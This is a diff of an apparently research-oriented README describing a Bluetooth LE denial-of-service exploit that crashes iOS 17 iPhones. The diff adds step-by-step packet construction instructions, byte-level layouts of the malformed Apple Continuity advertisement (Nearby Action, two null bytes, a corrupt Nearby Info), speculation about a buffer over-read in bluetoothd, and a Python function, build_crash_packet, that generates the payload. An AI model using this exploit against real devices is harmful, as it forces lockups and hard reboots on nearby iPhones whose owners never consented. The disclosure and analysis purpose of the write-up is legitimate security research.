@@ -233,11 +233,17 @@ signal.signal(signal.SIGINT, signal_handler)
 
 ### Crashing iOS - Breakdown of exploit process
 
-1. Create a packet containing a Nearby Action message followed by a Nearby Info message
-2. Create the Nearby Action message as normal, selecting an action at random.
-3. Between the two messages, include the bytes `00 00`
-4. Create the Nearby Info message , but use random values for length and data 
+This process was discovered by @ecto-1a during fuzzing / brute forcing of the continuity protocol. The exploit reflects this, playing back a random sequence of Nearby Actions, but including corrupt Nearby Info in the same packet. It's only been documented to trigger a system crash on newer iPhones running iOS 17. I've tested the behavior on an iPhone 13 Pro and Pro Max running iOS 17-17.1.1, and was not able to trigger a crash on an iPad mini or iPhone SE2 running iOS 17.1 (although it still causes innumerable popups).
 
+Newer phones, after showing a few popups will eventually stop responding, usually on a black screen. This requires a hard reboot (Vol+, Vol-, Hold Power) to restore service. If anyone tests it on iPhone SE3, iPhone 12, 11, 10(s) I'd love to know the results (mastodon:@jb0x168@infosec.exchange)
+
+To generate a packet for this process, we create a packet containing a Nearby Action message, two null bytes, followed by a Nearby Info message with a litle random data thrown in:
+1. Declare a valid size for the full packet
+2. Create valid "service data" envelope declaring that the data inside is Apple's custom protocol, and its size.
+3. Create the Nearby Action message as normal (valid size and payload), selecting an action at random.
+4. Between the two messages, include the bytes `00 00`
+5. Create the Nearby Info message, but supply 3 random bytes as the payload.
+ 
 A normal packet might look like this - it's not unusual to see Nearby Action and Nearby Info messages in the same packet:
 
 ```c
@@ -264,12 +270,6 @@ A normal packet might look like this - it's not unusual to see Nearby Action and
 0x00 // Action Type?
 0xe1, 0xef, 0xd2 //  Auth tag (3 bytes)
 
-(optional Nearby Action Data, first 3 bytes of the SHA256 of appleid, phone#, email, ssid - or random garbage)
-0x01, 0x05, 0x09, 
-0x02, 0x06, 0x0A, 
-0x03, 0x07, 0x0B, 
-0x04, 0x08, 0x0C 
-
 0x10 // Tag: Nearby Info
 0x05 // length
 0x01 // Status Flags / Action Code (upper/lower bits)
@@ -279,25 +279,14 @@ A normal packet might look like this - it's not unusual to see Nearby Action and
 <CRC>
 ```
 
-Depending on the Action Type of the nearby action, there may be additional fields that store partial SHA256 hashes of an AppleID, Phone Number, Email Address, or SSID. For our purposes, we're not interested in any of these additional fields, so if we're sending a packet that requires them, we can just supply random byte values (just be sure to increase the length field accordingly!)
-
-
 Our fudged packets look more like this:
 ```c
 <PREAMBLE>
 <ACCESS_ADDR>
-<PDU_HEADER> // NOTE: This contains an accurate size for the payload below, whereas the segments inside the payload will declare their own sizes incorrectly
+<PDU_HEADER>
 <ADV_ADDR>
 
-0x02 // size
-0x01 // Type: flags
-0x1a // Flags (specifics not important)
-
-0x02 // size
-0x0a // Type: Power Level
-0xFF // The power level value
-
-0x0e // size
+0x10 // size
 0xff //  manufacturer specific
 0x4c, 0x00 // Company: Apple Inc (0x004C)
 
@@ -305,13 +294,26 @@ Our fudged packets look more like this:
 0x05 // length
 0x90 // Action Flags
 <random action> // Nearby Action Type
-0xe1, 0xef, 0xd2 //  Auth tag (3 bytes)
+<random byte>, <random byte>, <random byte> //  Auth tag (3 bytes)
 
-0x00, 0x00, 0x10
+0x00,
+0x00,
+0x10,
 <random byte>, <random byte>, <random byte>
 
 <CRC>
 ```
+###
+
+The exact cause of the crash isn't known, but we can make a few educated guesses as to what might be happening.
+
+Reading the packet-byte-byte, everything is hunky-dory up until the end of the Nearby Action message. Since we still have bytes left in the overall size (Total size=0x10, or 16) we read the next byte, expecting to find a Continuity Message Type, for example 0x10 for a Nearby Info message.
+
+Instead, we get a message type of 0x00. This type has not been documented in any normal continuity messages. Assuming that it still gets parsed, the next byte would be the message size, but uh-oh! it's also 0x00.
+
+A number of things could be happening next. The most logical thing would be for the system to throw away both these values, and try again with the next byte to find a triplet of (type,size,data) that is equal to or less than the remaining size (4 bytes). This time, we give it a valid message type (0x10, Nearby Info), but instead of declaring a valid size for the rest of the message, we're supplying a random byte from 0-255. Regardless of the declared size, we only provide two more bytes.
+
+This alone could theoretically cause bluetoothd to read past the end of a buffer, but it doesn't explain the need for the two null bytes between messages. It's possible that there's some other behavior associated with parsing a type of 0x00 with a size of 0x00 that puts some other part of the system into a bad state. More testing is required to answer this definitively.
 
 #### Error logs
 When the device locks up, a flurry of messages are seen across various services. I've observed these beginning with messages about mismatched packet lengths in bluetoothd (as you would expect from the exploit) followed by invalid connection states, and culminating in a number of other processes that rely on services from bluetoothd failing in various ways. 
@@ -373,9 +375,9 @@ def build_crash_packet():
     service_data = (0xff, 0x4c, 0x00)
     action_data  = (0x0f, 0x05, flags, action, randint(0,255), randint(0,255), randint(0,255))
     null_data    = (0x00, 0x00)
-    garbage_info = (0x10, randint(0,255), randint(0,255), randint(0,255))
+    garbage_data = (0x10, randint(0,255), randint(0,255), randint(0,255))
 
-    return (total_size + service_data + action_data + null_data +  garbage_info)
+    return (total_size + service_data + action_data + null_data +  garbage_data)
 
 dev_id = 0
 
